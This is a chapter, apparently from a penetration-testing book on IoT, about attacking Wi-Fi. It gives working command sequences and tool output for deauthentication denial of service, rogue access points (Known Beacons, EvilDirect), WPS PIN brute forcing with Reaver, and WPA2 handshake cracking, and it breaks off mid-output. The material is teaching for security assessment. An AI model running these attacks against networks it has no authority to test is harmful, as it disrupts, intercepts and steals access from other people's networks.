<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="287" id="Page_287"/>12</span><br/>
<span class="ChapterTitle">Medium Range Radio: Hacking Wi-Fi</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">Medium-range radio technologies can connect devices across a range of up to 100 meters (approximately 328 feet). In this chapter, we focus on Wi-Fi, the most popular technology in IoT devices.</p>
<p>We explain how Wi-Fi works and then describe some of the most important attacks against it. Using a variety of tools, we perform disassociation and association attacks. We also abuse Wi-Fi Direct and walk through some popular ways of breaking WPA2 encryption.</p>
<h2 id="h1-500907c12-0001">How Wi-Fi Works</h2>
<p class="BodyFirst">Other medium-range radio technologies, such as Thread, Zigbee, and Z-Wave, were designed for low-rate applications with a maximum of 250Kbps, but Wi-Fi was created for high-rate data transfers. Wi-Fi also has a higher power consumption than the other technologies.</p>
<p>Wi-Fi connections involve an <em>access point (AP)</em>, the networking device that allows Wi-Fi devices to connect to a network, and a client that can <span epub:type="pagebreak" title="288" id="Page_288"/>connect to the AP. When a client successfully connects to an AP and data moves freely between them, we say the client is <em>associated</em> with the AP. We often use the term <em>station </em>(<em>STA</em>) to refer to any device that is capable of using the Wi-Fi protocol.</p>
<p>A Wi-Fi network can operate in either open or secure mode. In <em>open mode</em>, the AP won’t require authentication and will accept any client that attempts to connect. In <em>secure mode</em>, some form of authentication needs to take place before a client is connected to the AP. Some networks might also choose to be <em>hidden</em>; in that case, the network won’t broadcast its ESSID. An <em>ESSID</em> is the name of the network, such as “Guest” or “Free-WiFi.” A <em>BSSID</em> is the network’s MAC address. </p>
<p>Wi-Fi connections share data using<em> 802.11</em>, a set of protocols that implement Wi-Fi communications. More than 15 different protocols are in the 802.11 spectrum, and they’re labeled with letters. You might already be familiar with 802.11 a/b/g/n/ac, because you might have used any or all of them in the last 20 years. The protocols support different modulations and work on different frequencies and physical layers.</p>
<p>In 802.11, data is transferred via three major types of frames: data, control, and management. For the purpose of this chapter, we’ll work only with management frames. A <em>management frame</em> manages the network; for example, it’s used while searching for a network, authenticating clients, and even associating clients with APs. </p>
<h2 id="h1-500907c12-0002">Hardware for Wi-Fi Security Assessments</h2>
<p class="BodyFirst">Typically, a Wi-Fi security assessment includes attacks against APs and wireless stations. When it comes to testing IoT networks, both kinds of attacks are critical, because more and more devices are either capable of connecting to a Wi-Fi network or serving as APs.  </p>
<p>When targeting IoT devices in a wireless assessment, you’ll need a wireless card that supports AP monitor mode and is capable of packet injection. <em>Monitor mode</em> lets your device monitor all traffic it receives from the wireless network. <em>Packet injection capabilities</em> allow your card to spoof packets to appear as if they originate from a different source. For the purpose of this chapter, we used an Alfa Atheros AWUS036NHA network card. </p>
<p>In addition, you might need a configurable AP to test the various Wi-Fi settings. We used a portable TP-Link AP, but literally any AP would do. Unless the attacks are part of a red teaming engagement, the AP’s transmission power or the type of antenna you use aren’t important. </p>
<h2 id="h1-500907c12-0003">Wi-Fi Attacks Against Wireless Clients</h2>
<p class="BodyFirst">Attacks against wireless clients usually exploit the fact that 802.11 management frames aren’t cryptographically protected, leaving the packets exposed to eavesdropping, modification, or replay. You could accomplish all of these attacks through association attacks, which let the attacker <span epub:type="pagebreak" title="289" id="Page_289"/>become a man in the middle. Attackers can also perform deauthentication and denial-of-service attacks, which disrupt the victim’s Wi-Fi connectivity to their AP.</p>
<h3 id="h2-500907c12-0001">Deauthentication and Denial-of-Service Attacks</h3>
<p class="BodyFirst">Management frames in 802.11 can’t stop an attacker from spoofing a device’s MAC address. As a result, an attacker can forge spoofed <em>Deauthenticate</em> or <em>Disassociate frames</em>. These are management frames normally sent to terminate a client’s connection to the AP. For example, they’re sent if the client connects to another AP or simply disconnects from the original network. If forged, an attacker can use these frames to disrupt existing associations to specific clients. </p>
<p>Alternatively, instead of making the client disassociate from the AP, the attacker could flood the AP with authentication requests. These, in turn, cause a denial-of-service attack by keeping legitimate clients from connecting to the AP. </p>
<p>Both attacks are known denial-of-service attacks mitigated in <em>802.11w</em>, a standard that hasn’t yet propagated in the IoT world. In this section, we’ll perform a deauthentication attack that disconnects all wireless clients from an AP. </p>
<p>Start by installing the Aircrack-ng suite if you’re not using Kali, where it’s preinstalled. <em>Aircrack-ng</em> contains Wi-Fi assessment tools. Ensure your network card with packet injection capabilities is plugged in. Then use the <code>iwconfig</code> utility to identify the interface name belonging to the wireless card connected to your system: </p>
<pre><code># <b>apt-get install aircrack-ng</b>
#<em> </em><b>iwconfig</b>
docker0   no wireless extensions.
lo        no wireless extensions.
<span class="CodeAnnotationHang">1</span> wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off  
eth0      no wireless extensions.</code></pre>
<p>The output indicates that the wireless interface is <code>wlan0 </code><span class="CodeAnnotation">1</span>. </p>
<p>Because some processes in the system can interfere with the tools in the Aircrack-ng suite, use the Airmon-ng tool to check and automatically kill these processes. To do this, first disable the wireless interface using <code>ifconfig</code>:</p>
<pre><code># <b>ifconfig wlan0 down</b> 
# <b>airmon-ng check kill</b> 
Killing these processes:
PID Name
731 dhclient
1357 wpa_supplicant</code></pre>
<p><span epub:type="pagebreak" title="290" id="Page_290"/>Now set the wireless card to monitor mode using Airmon-ng: </p>
<pre><code># <b>airmon-ng start wlan0 </b>
<b>PHY    Interface     Driver        Chipset</b>
<b>phy0   wlan0         ath9k_htc     Qualcomm Atheros Communications AR9271 802.11n</b>
<b>       (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon) </b>
<b>       (mac80211 station mode vif disabled for [phy0]wlan0)</b></code></pre>
<p>This tool creates a new interface, named <code>wlan0mon</code>, which you can use to run a basic sniffing session with Airodump-ng. The following command identifies the AP’s BSSID (its MAC address) and the channel on which it’s transmitting: </p>
<pre><code># <b>airodump-ng wlan0</b><b>mon</b>
CH 11 ][ Elapsed: 36 s ][ 2019-09-19 10:47                                                                                                                        
BSSID              PWR  Beacons    #Data, #/s   CH  MB   ENC CIPHER AUTH ESSID 

6F:20:92:11:06:10  -77       15        0    0   6  130  WPA2 CCMP   PSK  ZktT 2.4Ghz               
6B:20:9F:10:15:6E  -85       14        0    0  11  130  WPA2 CCMP   PSK  73ad 2.4Ghz               
7C:31:53:D0:A7:CF  -86       13        0    0  11  130  WPA2 CCMP   PSK  A7CF 2.4Ghz 
82:16:F9:6E:FB:56  -40       11       39    0   6   65  WPA2 CCMP   PSK  Secure Home              
E5:51:61:A1:2F:78  -90        7        0    0   1  130  WPA2 CCMP   PSK  EE-cwwnsa             </code></pre>
<p>Currently, the BSSID is <code>82:16:F9:6E:FB:56</code> and the channel is <code>6</code>. We pass this data to Airodump-ng to identify clients connected to the AP: </p>
<pre><code># <b>airodump-ng wlan0mon --bssid  82:16:F9:6E:FB:56</b>
CH 6 |[ Elapsed: 42 s ] [ 2019-09-19 10:49
BSSID                   PWR Beacons  #Data, #/s   CH    MB  ENC  CIPHER AUTH ESSID
82:16:F9:6E:FB:56       -37      24    267    2    6    65  WPA2 CCMP   PSK  Secure Home
BSSID                   STATION           PWR   Rate     Lost     Frames   Probe
82:16:F9:6E:FB:56       50:82:D5:DE:6F:45 -28   0e- 0e    904        274   </code></pre>
<p>Based on this output, we identify one client connected to the AP. The client has the BSSID 50:82:D5:DE:6F:45 (the MAC address of their wireless network interface).</p>
<p>You could now send a number of disassociation packets to the client to force the client to lose internet connectivity. To perform the attack, we use Aireplay-ng: </p>
<pre><code># <b>aireplay-ng --deauth 0 -c 50:82:D5:DE:6F:45 -a 82:16:F9:6E:FB:56 wlan0mon</b></code></pre>
<p>The <code>--deauth</code> parameter specifies the disassociation attack and the number of disassociation packets that will be sent. Selecting <code>0</code> means the packets will be sent continuously. The <code>-a</code> parameter specifies the AP’s BSSID, and the <code>-c</code> parameter specifies the targeted devices. The next listing shows the command’s output:</p>
<pre><code>11:03:55   Waiting for beacon frame (BSSID:  82:16:F9:6E:FB:56) on channel 6
11:03:56   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|64 ACKS]
11:03:56   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [66|118 ACKS]
11:03:57   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [62|121 ACKS]
<span epub:type="pagebreak" title="291" id="Page_291"/>11:03:58   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [64|124 ACKS]
11:03:58   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [62|110 ACKS]
11:03:59   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [64|75 ACKS]
11:03:59   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [63|64 ACKS]
11:03:00   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [21|61 ACKS]
11:03:00   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|67 ACKS]
11:03:01   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|64 ACKS]
11:03:02   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|61 ACKS]
11:03:02   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|66 ACKS]
11:03:03   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|65 ACKS]</code></pre>
<p>The output shows the disassociation packets sent to the target. The attack succeeds when the target device becomes unavailable. When you check that device, you should see that it’s no longer connected to any network. </p>
<p>You can perform denial-of-service attacks against Wi-Fi in other ways, too.<em> Radio jamming,</em> another common method, interferes with wireless communications using any wireless protocol. In this attack, an attacker relies on a Software Defined Radio device or cheap, off-the-shelf Wi-Fi dongles to transmit radio signals and make a wireless channel unusable for other devices. We’ll show such an attack in Chapter 15. </p>
<p>Alternatively, you could perform <em>selective jamming</em>, a sophisticated version of a radio jamming attack in which the attacker jams only specific packets of high importance. </p>
<p>It’s worth noting that for certain chipsets, deauthentication attacks can also downgrade the encryption keys used for communication between the AP and the client. Recent research by the antivirus company ESET identified this vulnerability, which is known as Kr00k (CVE-2019-15126). When present, the deauthenticated Wi-Fi chipset uses an all-zero encryption key upon reassociation, which allows attackers to decrypt packets transmitted by the vulnerable device.</p>
<h3 id="h2-500907c12-0002">Wi-Fi Association Attacks</h3>
<p class="BodyFirst">An <em>association attack</em> tricks a wireless station into connecting to an attacker-controlled AP. If the target station is already connected to some other network, the attacker usually starts by implementing one of the deauthentication techniques we just explained. Once the victims no longer have a connection, the attacker can lure them into the rogue network by abusing different features of their network manager. </p>
<p>In this section, we outline the most popular association attacks and then demonstrate a Known Beacons attack. </p>
<h4 id="h3-500907c12-0001">The Evil Twin Attack</h4>
<p class="BodyFirst">The most common association attack is the <em>Evil Twin</em>, which tricks a client into connecting with a fake AP by making it believe it’s connecting to a known, legitimate one. </p>
<p>We can create a fake AP using a network adapter with monitoring and packet injection capabilities. With that network card, we’d set up the AP <span epub:type="pagebreak" title="292" id="Page_292"/>and configure its channel, ESSID, and BSSID, making sure to copy the ESSID and encryption type the legitimate network uses. Then we’d send a stronger signal than the legitimate AP’s signal. You can enhance your signal with various techniques, most reliably by being physically closer to your target than the legitimate AP or by using a stronger antenna.</p>
<h4 id="h3-500907c12-0002">The KARMA Attack</h4>
<p class="BodyFirst"><em>KARMA </em>attacks connect users to insecure networks by taking advantage of clients configured to discover wireless networks automatically. When configured in this way, the client issues a direct probe request asking for specific APs, then it connects to the one it finds without authenticating it. A <em>probe request</em> is a management frame that initiates the association process. Given this configuration, the attacker could simply confirm any of the client’s requests and connect it to a rogue AP.</p>
<p>For a KARMA attack to work, the devices you’re targeting must meet three requirements. The target network must be of type Open, the client must have the AutoConnect flag enabled, and the client must broadcast its preferred network list. The <em>preferred network list</em> is a list of networks to which the client has previously connected and now trusts. A client with the AutoConnect flag enabled will connect to an AP automatically, as long as the AP sends it an ESSID already listed in the client’s preferred network list. </p>
<p>Most modern operating systems aren’t vulnerable to KARMA attacks, because they don’t send their preferred network lists, but you might sometimes encounter a vulnerable system in older IoT devices or printers. If a device has ever connected to an open and hidden network, it’s definitely vulnerable to a KARMA attack. The reason is that the only way to connect to open hidden networks is to send a direct probe to them, in which case all the requirements for KARMA attacks are met. </p>
<h4 id="h3-500907c12-0003">Performing a Known Beacons Attack</h4>
<p class="BodyFirst">Since the discovery of the KARMA attack, most operating systems stopped directly probing APs; instead, they only use <em>passive reconnaissance</em>, in which the device listens for a known ESSID from a network. This type of behavior completely eliminates all occurrences of KARMA attacks.</p>
<p>A <em>Known Beacons attack</em> bypasses this security feature by taking advantage of the fact that many operating systems enable the AutoConnect<em> </em>flag by default. Because APs frequently have very common names, an attacker can often guess the ESSID of an open network in a device’s preferred network list. Then it tricks that device into automatically connecting to an attacker-controlled AP. </p>
<p>In a more sophisticated version of the attack, the adversary could use a dictionary of common ESSIDs, such as Guest, FREE Wi-Fi, and so on, that the victim has likely connected to in the past. This is a lot like trying to gain unauthorized access to a service account by just brute forcing the username when no password is required: a quite simple, yet effective attack.</p>
<p><a id="figureanchor12-1" href="#figure12-1">Figure 12-1</a> illustrates a Known Beacons attack. </p>
<span epub:type="pagebreak" title="293" id="Page_293"/><figure>
<img src="Images/f12001.png" alt="f12001" width="750" height="661"/>
<figcaption><p><a id="figure12-1">Figure 12-1:</a> A Known Beacons attack</p></figcaption>
</figure>
<p>The attacker’s AP begins by issuing multiple <em>beacon frames,</em> a type of management frame that contains all the network information. It’s broadcasted periodically to announce the presence of the network. If the victim has this network’s information in its preferred network list (because the victim has connected to that network in the past) and if the attacker and the victim APs are of the Open type, the victim will issue a probe request and connect to it. </p>
<p>Before walking through this attack, we need to set up our devices. Some devices might allow you to change the AutoConnect flag. The location of this setting differs from device to device, but it’s usually in the Wi-Fi preferences, as shown in <a id="figureanchor12-2" href="#figure12-2">Figure 12-2</a>, under a setting like “Auto reconnect.” Make sure it’s turned on.</p>
<figure>
<img src="Images/f12002.png" alt="f12002" width="365" height="351"/>
<figcaption><p><a id="figure12-2">Figure 12-2:</a> Wi-Fi preferences with the AutoConnect toggle</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="294" id="Page_294"/>Next, set up an open AP with the name <code>my_essid. </code>We did this using a portable TP-Link AP, but you can use any device you’d like. Once you’ve set it up, connect your victim device to the <code>my_essid </code>network. Then install <em>Wifiphisher </em>(<a href="https://github.com/wifiphisher/wifiphisher/" class="LinkURL">https://github.com/wifiphisher/wifiphisher/</a>), a rogue AP framework frequently used for network assessments. </p>
<p> To install Wifiphisher, use the following commands:</p>
<pre><code>$ <b>sudo apt-get install libnl-3-dev libnl-genl-3-dev libssl-dev</b>
$ <b>git clone </b><b>https://github.com/wifiphisher/wifiphisher.git</b>
$ <b>cd </b><b>wifiphisher </b><b>&amp;&amp; </b><b>sudo python</b><b>3</b><b> setup.py install</b></code></pre>
<p>Wifiphisher needs to target a specific network to start attacking that network’s clients. We create a test network, also called <code>my_essid</code>, to avoid affecting outside clients when we don’t have authorization to do so:</p>
<pre><code># <span class="CodeAnnotation">1</span> <b>wifiphisher -nD –essid my_essid -kB</b>
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2019-08-19 03:35
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wfphshr-wlan0 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:yy:yy:yy
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:xx:xx:xx
[+] Sending SIGKILL to wpa_supplicant
[*] Cleared leases, started DHCP, set up iptables
[+] Selecting OAuth Login Page template</code></pre>
<p>We start Wifiphisher in the Known Beacons mode by adding the <code>–kB</code> argument <span class="CodeAnnotation">1</span>. You don’t have to provide a wordlist for the attack because Wifiphisher has one built in. The wordlist contains common ESSIDs that the victim might have connected to in the past. Once you run the command, WifiPhisher’s interface should open, as shown in <a id="figureanchor12-3" href="#figure12-3">Figure 12-3</a>.</p>
<figure>
<img src="Images/f12003.png" alt="f12003" width="750" height="304"/>
<figcaption><p><a id="figure12-3">Figure 12-3:</a> Wifiphisher’s panel showing the victim device connecting to our network</p></figcaption>
</figure>
<p>Wifiphisher’s panel displays the number of connected victim devices. Currently, our test device is the only target device connected.</p>
<p>Look at the preferred network list of the device you’re targeting in this example. For instance, <a id="figureanchor12-4" href="#figure12-4">Figure 12-4</a> shows the preferred network list screen <span epub:type="pagebreak" title="295" id="Page_295"/>on a Samsung Galaxy S8+ device. Notice that it has two networks saved. The first one, <code>FreeAirportWiFi</code>, uses an easily guessable name. </p>
<figure>
<img src="Images/f12004.png" alt="f12004" width="365" height="255"/>
<figcaption><p><a id="figure12-4">Figure 12-4:</a> The victim device’s preferred network list screen</p></figcaption>
</figure>
<p>Sure enough, once we’ve executed the attack, the device should disassociate from its currently connected network and connect to our malicious, fake network (<a id="figureanchor12-5" href="#figure12-5">Figure 12-5</a>).</p>
<figure>
<img src="Images/f12005.png" alt="f12005" width="365" height="459"/>
<figcaption><p><a id="figure12-5">Figure 12-5:</a> The victim device connects to a fake network as a result of the Known Beacons attack.</p></figcaption>
</figure>
<p>From this point on, the attacker can work as a man in the middle, monitoring the victim’s traffic or even tampering with it.</p>
<h3 id="h2-500907c12-0003">Wi-Fi Direct</h3>
<p class="BodyFirst">Wi-Fi Direct is a Wi-Fi standard that allows devices to connect to each other without a wireless AP. In a traditional architecture, all devices connect to one AP to communicate with one another. In Wi-Fi Direct, one of the two devices acts as the AP instead. We call this device the <em>group owner</em>. For Wi-Fi Direct to work, only the group owner must comply with the Wi-Fi Direct standard. </p>
<p>You can find Wi-Fi Direct in devices like printers, TVs, gaming consoles, audio systems, and streaming devices. Many IoT devices that support Wi-Fi Direct are simultaneously connected to a standard Wi-Fi network. For example, a home printer might be able to accept photos directly from <span epub:type="pagebreak" title="296" id="Page_296"/>your smartphone via Wi-Fi Direct, but it’s also probably connected to a local network. </p>
<p>In this section, we’ll review how Wi-Fi Direct works, what its main modes of operation are, and which techniques you can use to exploit its security features. </p>
<h4 id="h3-500907c12-0004">How Wi-Fi Direct Works</h4>
<p class="BodyFirst"><a id="figureanchor12-6" href="#figure12-6">Figure 12-6</a> shows how devices establish a connection using Wi-Fi Direct.</p>
<figure>
<img src="Images/f12006.png" alt="f12006" width="372" height="101"/>
<figcaption><p><a id="figure12-6">Figure 12-6:</a> Main phases of device connection in Wi-Fi Direct</p></figcaption>
</figure>
<p>In the Device Discovery phase, a device sends a broadcast message to all nearby devices, requesting their MAC addresses. At this stage, there is no group owner, so any device can initiate this step. Next, in the Service Discovery phase, the device receives the MAC addresses and proceeds with a unicast service request to each device asking for more information about their services. This allows it to decide whether it wants to connect to each device. After the Service Discovery phase, the two devices decide which will be the group owner and which will be the client.</p>
<p>In the final phase, Wi-Fi Direct relies on Wi-Fi Protected Setup (WPS) to securely connect the devices. <em>WPS</em> is a protocol originally created to allow less tech-savvy home users to easily add new devices on the network. WPS has multiple configuration methods: Push-Button Configuration (PBC), PIN entry, and Near-Field Communication (NFC). In <em>PBC</em>, the group owner has a physical button, which, if pressed, starts broadcasting for 120 seconds. In that time, the clients can connect to the group owner using their own software or hardware button. This makes it possible for a confused user to press a button on a victim device, such as a TV, and grant access to a foreign and potentially malicious device, such as the attacker’s smartphone. In <em>PIN entry</em> mode, the group owner has a specific PIN code, which, if entered by a client, automatically connects the two devices. In <em>NFC</em> mode, just tapping the two devices is enough to connect them to the network.</p>
<h4 id="h3-500907c12-0005">PIN Brute Forcing Using Reaver</h4>
<p class="BodyFirst">Attackers can brute force the code in the PIN entry configuration. This attack can resemble a one-click phishing attack, and you can use it with any device that supports Wi-Fi Direct with PIN entry. </p>
<p>This attack takes advantage of a weakness in the eight-digit WPS PIN code; because of this issue, the protocol discloses information about the PIN’s first four digits, and the last digit works as a checksum, which makes brute forcing the WPS AP easy. Note that some devices include brute-force protections, which usually block MAC addresses that repeatedly try to <span epub:type="pagebreak" title="297" id="Page_297"/>attack. In that case, the complexity of this attack increases, because you’d have to rotate MAC addresses while testing PINs.</p>
<p>Currently, you’ll rarely find APs with WPS PIN mode enabled, because off-the-shelf tools exist to brute force their pins. One such tool, Reaver, is preinstalled in Kali Linux. In this example, we’ll use Reaver to brute force WPS PIN entry. Even though this AP enforces a brute-force protection through rate limiting, we should be able to recover the PIN given enough time. (<em>Rate limiting</em> restricts how many requests an AP will accept from a client within a predefined timeframe.)</p>
<pre><code># <span class="CodeAnnotation">1</span> <b>reaver -i wlan0mon -b 0c:80:63:c5:1a:8a -vv</b>
Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt; 
[+] Waiting for beacon from 0C:80:63:C5:1A:8A
[+] Switching wlan0mon to channel 11
[+] Received beacon from 0C:80:63:C5:1A:8A
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...…
...
[+] Received WSC NACK
[+] Sending WSC NACK
[!] WARNING: <span class="CodeAnnotation">2</span> Detected AP rate limiting, waiting 60 seconds before re-checking
 ...
[+] <span class="CodeAnnotation">3</span> WPS PIN: ‘23456780’</code></pre>
<p>As you can see, Reaver <span class="CodeAnnotation">1</span> targets our test network and starts brute forcing its PIN. Next, we encounter rate limiting <span class="CodeAnnotation">2</span>, which severely delays our efforts, because Reaver automatically pauses before making another attempt. Finally, we recover the WPS PIN <span class="CodeAnnotation">3</span>.</p>
<h4 id="h3-500907c12-0006">EvilDirect Hijacking Attacks</h4>
<p class="BodyFirst">The EvilDirect attack works a lot like the Evil Twin attack described earlier in this chapter, except it targets devices using Wi-Fi Direct. This association attack takes place during the PBC connection process. During this process, the client issues a request to connect to the group owner and then waits for its acceptance. An attacking group owner with the same MAC address and ESSID, operating on the same channel, could intercept the request and lure the victim client to associate with it instead.</p>
<p>Before you can attempt this attack, you’ll have to impersonate the legitimate group owner. Use Wifiphisher to identify the target Wi-Fi Direct network. Extract the group owner’s channel, ESSID, and MAC address, and then create a new group owner, using the extracted data to configure it. Connect the victim to your fake network by having a better signal than the original group owner, as described earlier. </p>
<p>Next, kill all processes that interfere with Airmon-ng, as we did earlier in this chapter:</p>
<pre><code># <b>airmon-ng check kill</b></code></pre>
<p><span epub:type="pagebreak" title="298" id="Page_298"/>Then put your wireless interface in monitor mode using iwconfig: </p>
<pre><code><span class="CodeAnnotationHang">1</span> # <b>iwconfig</b>
   eth0      no wireless extensions.
   lo        no wireless extensions.
  <span class="CodeAnnotationCode">2</span> wlan0  IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off

<span class="CodeAnnotationHang">3</span> # <b>airmon-ng start wlan0</b></code></pre>
<p>The <code>iwconfig</code><em> </em>command <span class="CodeAnnotation">1</span> lets you identify the name of your wireless adapter. Ours is named <code>wlan0 </code><span class="CodeAnnotation">2</span>. Once you have that name, use the command  <code>airmon-ng start wlan0</code><span class="CodeAnnotation">3</span> to safely put it in monitor mode. </p>
<p>Next, run Airbase-ng, a multipurpose tool in the Aircrack-ng suite aimed at attacking Wi-Fi clients. As command line arguments, provide the channel (<code>-c</code>), ESSID (<code>-e</code>), BSSID (<code>-a</code>), and the monitoring interface, which in our case is <code>mon0</code>. We extracted this information in the previous step.</p>
<pre><code># <b>airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0</b>
04:47:17  Created tap interface at0
04:47:17  Trying to set MTU on at0 to 1500
04:47:17  Access Point with BSSID BB:BB:BB:BB:BB:BB started.
04:47:37 <span class="CodeAnnotation">1</span> Client AA:AA:AA:AA:AA:AA associated (WPA2;CCMP) to ESSID: "DIRECT-5x-BRAVIA"</code></pre>
<p>The output indicates that the attack worked <span class="CodeAnnotation">1</span>; our target client is now associated to the malicious AP.</p>
<p><a id="figureanchor12-7" href="#figure12-7">Figure 12-7</a> proves that our attack succeeded. We managed to connect the victim phone to our fake BRAVIA TV by impersonating the original TV’s Wi-Fi Direct network, DIRECT-5x-BRAVIA. </p>
<figure>
<img src="Images/f12007.png" alt="f12007" width="375" height="420"/>
<figcaption><p><a id="figure12-7">Figure 12-7:</a> Victim device connected to a fake AP through an EvilDirect attack</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="299" id="Page_299"/>In a real-world example, we’d also want to have a DHCP server configured to forward all packets to their destinations. That way, we wouldn’t disrupt the victim’s communication, providing a seamless experience to the victim. </p>
<h2 id="h1-500907c12-0004">Wi-Fi Attacks Against APs</h2>
<p class="BodyFirst">It’s not uncommon in the IoT world for IoT devices to act as APs. This often occurs when a device creates an open AP for its setup process (for example, Amazon Alexa and Google Chromecast do this). Modern mobile devices can also serve as APs to share their Wi-Fi connectivity with other users, and smart cars feature built-in Wi-Fi hotspots enhanced by a 4G LTE connection.</p>
<p>Hacking an AP usually means breaking its encryption. In this section, we’ll explore attacks against WPA and WPA2, two protocols used to secure wireless computer networks. WPA is an upgraded version of <em>WEP</em>, a highly insecure protocol you might still encounter in certain older IoT devices. WEP generates an Initialization Vector (IV) with a rather small length—just 24 bits— which is created using <em>RC4</em>, a deprecated and insecure cryptographic function. In turn, WPA2 is an upgraded version of WPA that introduced an Advanced Encryption Standard (AES)–based encryption mode. </p>
<p>Let’s discuss WPA/WPA2 Personal and Enterprise networks and identify key attacks against them. </p>
<h3 id="h2-500907c12-0004">Cracking WPA/WPA2</h3>
<p class="BodyFirst">You can crack a WPA/WPA2 network in two ways. The first targets networks that use preshared keys. The second targets the <em>Pairwise Master Key Identifier (PMKID)</em> field found in networks that enable roaming with the 802.11r standard. While roaming, a client can connect to different APs belonging to the same network without having to reauthenticate to each one. Although the PMKID attack has greater success rate, it doesn’t affect all the WPA/WPA2 networks, because the PMKID field is optional. The preshared key attack is a brute-force attack, which has a lower success rate.</p>
<h4 id="h3-500907c12-0007">Preshared Key Attacks</h4>
<p class="BodyFirst">WEP, WPA, and WPA2 all rely on secret keys that the two devices must share, ideally over a secure channel, before they can communicate. In all three protocols, APs use the same preshared key with all their clients. </p>
<p>To steal this key, we need to capture a complete four-way handshake. The <em>WPA/WPA2 four-way handshake</em> is a communication sequence that lets the AP and wireless client prove to each other that they both know the preshared key without ever disclosing it over the air. By capturing the four-way handshake, an attacker can mount an offline brute-force attack and expose the key.  </p>
<p><span epub:type="pagebreak" title="300" id="Page_300"/>Also known as an <em>Extensible Authentication Protocol (EAP)</em> over LAN (EAPOL) handshake, the four-way handshake that WPA2 uses (<a id="figureanchor12-8" href="#figure12-8">Figure 12-8</a>) involves the generation of multiple keys based on the preshared one. </p>
<figure>
<img src="Images/f12008.png" alt="f12008" width="750" height="480"/>
<figcaption><p><a id="figure12-8">Figure 12-8:</a> WPA2 four-way handshake</p></figcaption>
</figure>
<p>First, the client uses the preshared key, called the Pairwise-Master Key (PMK), to generate a second key, called the Pairwise Transient Key (PTK), using both devices’ MAC addresses and a nonce from both parties. This requires the AP to send the client its nonce, called the A-nonce. (The client already knows its own MAC address, and it receives the AP’s once the two devices begin communicating, so the devices don’t need to send those again.)</p>
<p>Once the client has generated the PTK, it sends the AP two items: its own nonce, called the S-nonce, and a hash of the PTK, called a <em>Message Integrity Code (MIC)</em>. The AP then generates the PTK on its own and verifies the MIC it received. If the MIC is valid, the AP issues a third key, called the <em>Group Temporal Key (GTK)</em>, which is used to decrypt and broadcast traffic to all clients. The AP sends the GTK’s MIC and the full value of GTK. The client validates these and responds with an acknowledgment (ACK). </p>
<p>The devices send all these messages as EAPOL frames, a type of frame that the 802.1X protocol uses.</p>
<p>Let’s attempt to crack a WPA2 network. To get the PMK, we need to extract the A-nonce, S-nonce, both MAC addresses, and the PTK’s MIC. Once we have these values, we can perform an offline brute-force attack to crack the password.</p>
<p>In this example, we’ve set up an AP operating in WPA2 preshared key mode and then connected a smartphone to that AP. You could replace the client with a laptop, smartphone, IP camera, or other device. We’ll use Aircrack-ng to demonstrate the attack. </p>
<p><span epub:type="pagebreak" title="301" id="Page_301"/>First, put your wireless interface in monitor mode and extract the AP’s BSSID. Refer to “Deauthentication and Denial-of-Service Attacks” on page 289 for complete instructions on how to do this. In our case, we learned the AP’s operation channel is 1 and its BSSID is <code>0C:0C:0C:0C:0C:0C</code>. </p>
<p>Continue monitoring passively, which will require some time, because we’ll have to wait until a client connects to the AP. You could accelerate this process by sending deauthentication packets to an already connected client. By default, a deauthenticated client will try to reconnect to their AP, initiating the four-way handshake again.</p>
<p>Once a client has connected, use Airodump-ng<code/>to start capturing frames sent to the target network:</p>
<pre><code>#<b> airmon-ng check kill</b> 
# <b>airodump-ng</b> <b>-c </b><b>6</b><b> --bssid 0C:0C:0C:0C:0C:0C wlan0mo -w dump</b></code></pre>
<p>Once we’ve captured frames for a couple of minutes, we start our brute-force attack to crack the key. We can do this quickly using Aircrack-ng:</p>
<pre><code># <b>aircrack-ng -a2 -b 0C:0C:0C:0C:0C:0C -w list dump-01.cap</b>
                              Aircrack-ng 1.5.2 
      [00:00:00] 4/1 keys tested (376.12 k/s) 
      Time left: 0 seconds                                     400.00%
                            KEY FOUND! [ 24266642 ]
  
      Master Key     : 7E 6D 03 12 31 1D 7D 7B 8C F1 0A 9E E5 B2 AB 0A 
